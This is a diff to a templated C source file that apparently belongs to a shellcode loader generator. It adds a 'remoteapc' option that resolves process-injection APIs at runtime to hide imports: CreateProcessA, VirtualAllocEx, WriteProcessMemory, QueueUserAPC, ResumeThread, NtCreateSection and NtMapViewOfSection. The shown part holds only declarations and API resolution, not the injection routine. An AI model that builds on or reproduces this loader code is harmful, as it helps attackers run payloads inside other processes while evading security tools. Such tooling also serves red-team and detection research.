@@ -19,6 +19,19 @@ typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTE
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+{% if execution_method == 'remoteapc' %}
+typedef int (WINAPI* pLstrlenA)(LPCSTR);
+typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
+typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
+typedef DWORD (WINAPI* pResumeThread)(HANDLE);
+typedef NTSTATUS (WINAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (WINAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
+typedef DWORD (WINAPI* pGetLastError)(VOID);
+{% endif %}
 {% if data_source == 'embedded' %}
 typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
 typedef HGLOBAL (WINAPI* pLoadResource)(HMODULE, HRSRC);
@@ -58,6 +71,19 @@ pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlZeroMemory pfnRtlZeroMemory;
+{% if execution_method == 'remoteapc' %}
+pLstrlenA pfnLstrlenA;
+pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
+pCreateProcessA pfnCreateProcessA;
+pVirtualAllocEx pfnVirtualAllocEx;
+pWriteProcessMemory pfnWriteProcessMemory;
+pVirtualProtectEx pfnVirtualProtectEx;
+pQueueUserAPC pfnQueueUserAPC;
+pResumeThread pfnResumeThread;
+pNtCreateSection pfnNtCreateSection;
+pNtMapViewOfSection pfnNtMapViewOfSection;
+pGetLastError pfnGetLastError;
+{% endif %}
 {% if data_source == 'embedded' %}
 pFindResourceA pfnFindResourceA;
 pLoadResource pfnLoadResource;
@@ -99,6 +125,18 @@ void ResolveAPIs() {
     pfnGetFileSize = (pGetFileSize)pfnGetProcAddress(hKernel32, "GetFileSize");
     pfnReadFile = (pReadFile)pfnGetProcAddress(hKernel32, "ReadFile");
 
+    {% if execution_method == 'remoteapc' %}
+    pfnLstrlenA = (pLstrlenA)pfnGetProcAddress(hKernel32, "lstrlenA");
+    pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)pfnGetProcAddress(hKernel32, "GetEnvironmentVariableA");
+    pfnCreateProcessA = (pCreateProcessA)pfnGetProcAddress(hKernel32, "CreateProcessA");
+    pfnVirtualAllocEx = (pVirtualAllocEx)pfnGetProcAddress(hKernel32, "VirtualAllocEx");
+    pfnWriteProcessMemory = (pWriteProcessMemory)pfnGetProcAddress(hKernel32, "WriteProcessMemory");
+    pfnVirtualProtectEx = (pVirtualProtectEx)pfnGetProcAddress(hKernel32, "VirtualProtectEx");
+    pfnQueueUserAPC = (pQueueUserAPC)pfnGetProcAddress(hKernel32, "QueueUserAPC");
+    pfnResumeThread = (pResumeThread)pfnGetProcAddress(hKernel32, "ResumeThread");
+    pfnGetLastError = (pGetLastError)pfnGetProcAddress(hKernel32, "GetLastError");
+    {% endif %}
+
     {% if data_source == 'embedded' %}
     pfnFindResourceA = (pFindResourceA)pfnGetProcAddress(hKernel32, "FindResourceA");
     pfnLoadResource = (pLoadResource)pfnGetProcAddress(hKernel32, "LoadResource");
@@ -110,6 +148,11 @@ void ResolveAPIs() {
     if (hNtdll == NULL) { return; }
     pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
     pfnRtlZeroMemory = (pRtlZeroMemory)pfnGetProcAddress(hNtdll, "RtlZeroMemory");
+
+    {% if execution_method == 'remoteapc' or allocation_method == 'mappedsection' %}
+    pfnNtCreateSection = (pNtCreateSection)pfnGetProcAddress(hNtdll, "NtCreateSection");
+    pfnNtMapViewOfSection = (pNtMapViewOfSection)pfnGetProcAddress(hNtdll, "NtMapViewOfSection");
+    {% endif %}
 
     {% if bytecode_compression == 'mszip_compressor' %}
     HMODULE hCabinet = pfnGetModuleHandleA("cabinet.dll");
